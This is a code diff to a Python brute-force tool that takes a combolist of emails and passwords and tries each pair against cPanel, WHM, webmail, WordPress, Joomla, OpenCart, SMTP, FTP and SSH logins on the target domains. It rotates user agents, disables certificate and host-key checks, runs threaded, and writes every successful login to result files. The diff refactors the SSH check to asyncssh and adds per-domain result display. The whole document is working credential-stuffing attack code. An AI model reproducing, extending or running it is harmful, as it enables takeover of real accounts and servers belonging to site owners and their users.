@@ -6,8 +6,10 @@ from colorama import Fore, init
 import re
 from ftplib import FTP, error_perm
 import smtplib
-import paramiko
+import asyncssh
 import random
+import socket
+import asyncio
 from lib.tools.utils import banner, clear
 from lib.tools.colors import wh, r, g
 
@@ -32,6 +34,23 @@ class BruteForceTool:
         }
         # Disable warnings
         requests.packages.urllib3.disable_warnings()
+        # Initialize results dictionary
+        self.results = {}
+
+    def update_result(self, domain, service, success):
+        if domain not in self.results:
+            self.results[domain] = {}
+        self.results[domain][service] = success
+        self.print_domain_results(domain)
+
+    def print_domain_results(self, domain):
+        if domain in self.results:
+            result_str = f"{self.colors['white']}http://{domain} "
+            services = sorted(self.results[domain].items())
+            for service, success in services:
+                color = self.colors['green'] if success else self.colors['red']
+                result_str += f"{color}[{service}]{self.colors['reset']} "
+            print(f"\r{result_str}")
 
     def URLdomain_luv(self, site):
         site = site.replace("http://", "").replace("https://", "").replace("www.", "")
@@ -41,125 +60,144 @@ class BruteForceTool:
         try:
             with open('lib/files/user-agent.txt', 'r', encoding='utf-8') as f:
                 user_agents = [line.strip() for line in f if line.strip()]
-            if user_agents:
-                return random.choice(user_agents)
-            else:
-                return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
+            return random.choice(user_agents) if user_agents else 'Mozilla/5.0'
         except FileNotFoundError:
-            print(f"{self.colors['red']}[!] User-agent file not found: lib/files/random_agen.txt")
-            return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
-
+            return 'Mozilla/5.0'
 
     def perform_login(self, url, payload, success_keywords, result_file, user, pwd):
         try:
-            headers = {"User-Agent": self.get_random_user_agent()}  # Use random user-agent
+            headers = {"User-Agent": self.get_random_user_agent()}
             response = requests.post(url, data=payload, headers=headers, verify=False, timeout=15)
-            if any(keyword in response.text for keyword in success_keywords):
-                print(f"{self.colors['green']}[GOTCHAA!!!!] {url}|{user}|{pwd}")
+            success = any(keyword in response.text for keyword in success_keywords)
+            domain = self.URLdomain_luv(url)
+            service_type = result_file.split('/')[-1].split('.')[0].lower()
+            
+            if success:
                 with open(result_file, 'a') as file:
                     file.write(f"{url}@{user}#{pwd}\n")
-            else:
-                print(f"{self.colors['red']}[SADLY] {url}|{user}|{pwd}")
-        except requests.RequestException:
-            print(f"{self.colors['red']}[Error] Connection failed: {url}")
+            
+            self.update_result(domain, service_type, success)
+        except Exception:
+            domain = self.URLdomain_luv(url)
+            service_type = result_file.split('/')[-1].split('.')[0].lower()
+            self.update_result(domain, service_type, False)
 
     def check_smtp(self, email, pwd, domain):
         try:
-            smtp_server = f"mail.{domain}"  # Adjust this as necessary for specific domains
-            port = 587  # Common SMTP port for TLS
+            smtp_server = f"mail.{domain}"
+            port = 587
             with smtplib.SMTP(smtp_server, port, timeout=10) as server:
                 server.starttls()
                 server.login(email, pwd)
-                print(f"{self.colors['green']}[GOTCHAA!!!!] SMTP Login Successful: {email}|{pwd}")
                 with open('Result/SMTP.txt', 'a') as file:
                     file.write(f"{email}|{pwd}\n")
-        except smtplib.SMTPAuthenticationError:
-            print(f"{self.colors['red']}[SADLY] SMTP Authentication Failed: {email}|{pwd}")
-        except Exception as e:
-            print(f"{self.colors['red']}[Error] {e}")
-
-    def check_cpanel(self, email, pwd):
-        domain = self.URLdomain_luv(email.split('@')[1])
-        user = email.split('@')[0]
-        payload = {'user': user, 'pass': pwd, 'login_submit': 'Log in', 'goto_uri': '/'}
-        self.perform_login(f'https://{domain}:2083/login/', payload, ['lblDomainName', 'email_accounts'], 'Result/cPanels.txt', user, pwd)
-
-    def check_wehaem(self, email, pwd):
-        domain = self.URLdomain_luv(email.split('@')[1])
-        user = email.split('@')[0]
-        payload = {'user': user, 'pass': pwd, 'login_submit': 'Log in', 'goto_uri': '/'}
-        self.perform_login(f'https://{domain}:2087/login/', payload, ['Top Tools', 'Hostname'], 'Result/WHM.txt', user, pwd)
-
-    def check_webmail(self, email, pwd):
-        domain = self.URLdomain_luv(email.split('@')[1])
-        user = email.split('@')[0]
-        payload = {'user': user, 'pass': pwd, 'login_submit': 'Log in', 'goto_uri': '/'}
-        self.perform_login(f'https://{domain}:2096/login/', payload, ['id_autoresponders'], 'Result/Wemail.txt', user, pwd)
-
-    def check_wp_credentials(self, email, password, domain):
-        url = f"https://{domain}/wp-login.php"
-        payload = {"log": email, "pwd": password}
-        # Attempt login with full email
-        self.perform_login(url, payload, ["wpwrap"], "Result/Wordpress.txt", email, password)
-        # Attempt login with only username
-        username = email.split('@')[0]
-        payload['log'] = username
-        self.perform_login(url, payload, ["wpwrap"], "Result/Wordpress.txt", username, password)
-
-    def check_joomla_credentials(self, email, password, domain):
-        url = f"https://{domain}/administrator/index.php"
-        payload = {"username": email.split('@')[0], "passwd": password, "task": "login", "submit": "Login"}
-        # Attempt login with only username
-        username = email.split('@')[0]
-        payload['username'] = username
-        self.perform_login(url, payload, ["control panel"], "Result/Joomla.txt", username, password)
-
-    def check_opencart_credentials(self, email, password, domain):
-        url = f"https://{domain}/admin/index.php"
-        payload = {"username": email.split('@')[0], "password": password}
-        # Attempt login with username
-        username = email.split('@')[0]
-        payload['username'] = username
-        self.perform_login(url, payload, ["common/logout"], "Result/OpenCart.txt", username, password)
+                self.update_result(domain, 'smtp', True)
+        except Exception:
+            self.update_result(domain, 'smtp', False)
 
     def check_ftp(self, email, pwd, domain):
         try:
             ftp_server = domain
             ftp = FTP(ftp_server, timeout=10)
-            ftp.login(user=email.split('@')[0], passwd=pwd)  # Use only username part of the email
-            print(f"{self.colors['green']}[GOTCHAA!!!!] FTP Login Successful: {email}|{pwd}")
+            ftp.login(user=email.split('@')[0], passwd=pwd)
             with open('Result/FTP.txt', 'a') as file:
                 file.write(f"[+] URLs: {domain}\n[+] Username: {email}\n[+] Password: {pwd}\n\n")
+            self.update_result(domain, 'ftp', True)
             ftp.quit()
-        except error_perm:
-            print(f"{self.colors['red']}[SADLY] FTP Authentication Failed: {email}|{pwd}")
-        except Exception as e:
-            print(f"{self.colors['red']}[Error] {e}")
+        except Exception:
+            self.update_result(domain, 'ftp', False)
+
+    async def async_check_ssh(self, email, pwd, domain):
+        try:
+            username = email.split('@')[0]
+            
+            # Set connection options
+            options = {
+                'username': username,
+                'password': pwd,
+                'known_hosts': None,  # Don't verify host keys
+                'preferred_auth': ['password'],
+                'connect_timeout': 3,
+                'login_timeout': 3
+            }
+            
+            # Try to connect
+            async with await asyncssh.connect(domain, port=22, **options) as conn:
+                # If we get here, connection was successful
+                with open('Result/SSH.txt', 'a') as file:
+                    file.write(f"{domain}@{email}#{pwd}\n")
+                self.update_result(domain, 'ssh', True)
+                
+        except (asyncssh.DisconnectError, asyncssh.ProcessError, 
+                asyncssh.ChannelOpenError, asyncssh.PermissionDenied,
+                OSError, TimeoutError):
+            self.update_result(domain, 'ssh', False)
+        except Exception:
+            self.update_result(domain, 'ssh', False)
 
     def check_ssh(self, email, pwd, domain):
+        # Run the async SSH check in the event loop
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
         try:
-            ssh = paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(domain, username=email.split('@')[0], password=pwd, timeout=10)
-            print(f"{self.colors['green']}[GOTCHAA!!!!] SSH Login Successful: {email}|{pwd}")
-            with open('Result/SSH.txt', 'a') as file:
-                file.write(f"{domain}@{email}#{pwd}\n")
-            ssh.close()
-        except paramiko.AuthenticationException:
-            print(f"{self.colors['red']}[SADLY] SSH Authentication Failed: {email}|{pwd}")
-        except Exception as e:
-            print(f"{self.colors['red']}[Error] {e}")
+            loop.run_until_complete(self.async_check_ssh(email, pwd, domain))
+        finally:
+            loop.close()
+
+    def check_cpanel(self, email, pwd):
+        domain = self.URLdomain_luv(email.split('@')[1])
+        user = email.split('@')[0]
+        payload = {'user': user, 'pass': pwd, 'login_submit': 'Log in'}
+        self.perform_login(f'https://{domain}:2083/login/', payload, ['lblDomainName'], 'Result/cPanels.txt', user, pwd)
+
+    def check_wehaem(self, email, pwd):
+        domain = self.URLdomain_luv(email.split('@')[1])
+        user = email.split('@')[0]
+        payload = {'user': user, 'pass': pwd}
+        self.perform_login(f'https://{domain}:2087/login/', payload, ['Top Tools'], 'Result/WHM.txt', user, pwd)
+
+    def check_webmail(self, email, pwd):
+        domain = self.URLdomain_luv(email.split('@')[1])
+        user = email.split('@')[0]
+        payload = {'user': user, 'pass': pwd}
+        self.perform_login(f'https://{domain}:2096/login/', payload, ['id_autoresponders'], 'Result/Wemail.txt', user, pwd)
+
+    def check_wp_credentials(self, email, pwd, domain):
+        url = f"https://{domain}/wp-login.php"
+        username = email.split('@')[0]
+        payload = {"log": username, "pwd": pwd}
+        self.perform_login(url, payload, ["wpwrap"], "Result/Wordpress.txt", username, pwd)
+
+    def check_joomla_credentials(self, email, pwd, domain):
+        url = f"https://{domain}/administrator/index.php"
+        username = email.split('@')[0]
+        payload = {"username": username, "passwd": pwd, "task": "login"}
+        self.perform_login(url, payload, ["control panel"], "Result/Joomla.txt", username, pwd)
+
+    def check_opencart_credentials(self, email, pwd, domain):
+        url = f"https://{domain}/admin/index.php"
+        username = email.split('@')[0]
+        payload = {"username": username, "password": pwd}
+        self.perform_login(url, payload, ["common/logout"], "Result/OpenCart.txt", username, pwd)
 
     def check_other_services(self, email, pwd, domain):
-        self.check_cpanel(email, pwd)
-        self.check_wehaem(email, pwd)
-        self.check_webmail(email, pwd)
-        self.check_wp_credentials(email, pwd, domain)
-        self.check_joomla_credentials(email, pwd, domain)
-        self.check_opencart_credentials(email, pwd, domain)
-        self.check_smtp(email, pwd, domain)
-        self.check_ftp(email, pwd, domain)
-        self.check_ssh(email, pwd, domain)
+        services = [
+            (self.check_cpanel, [email, pwd]),
+            (self.check_wehaem, [email, pwd]),
+            (self.check_webmail, [email, pwd]),
+            (self.check_wp_credentials, [email, pwd, domain]),
+            (self.check_joomla_credentials, [email, pwd, domain]),
+            (self.check_opencart_credentials, [email, pwd, domain]),
+            (self.check_smtp, [email, pwd, domain]),
+            (self.check_ftp, [email, pwd, domain]),
+            (self.check_ssh, [email, pwd, domain])
+        ]
+        
+        for service_func, args in services:
+            try:
+                service_func(*args)
+            except Exception:
+                continue
 
     def read_combolist(self, file_name):
         combolist = []
@@ -187,7 +225,8 @@ class BruteForceTool:
 
     def brute_force(self, combolist, thread_count):
         with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
-            futures = [executor.submit(self.run_checks, email, password, domain) for email, password, domain in combolist]
+            futures = [executor.submit(self.run_checks, email, password, domain) 
+                      for email, password, domain in combolist]
             for future in concurrent.futures.as_completed(futures):
                 try:
                     future.result()
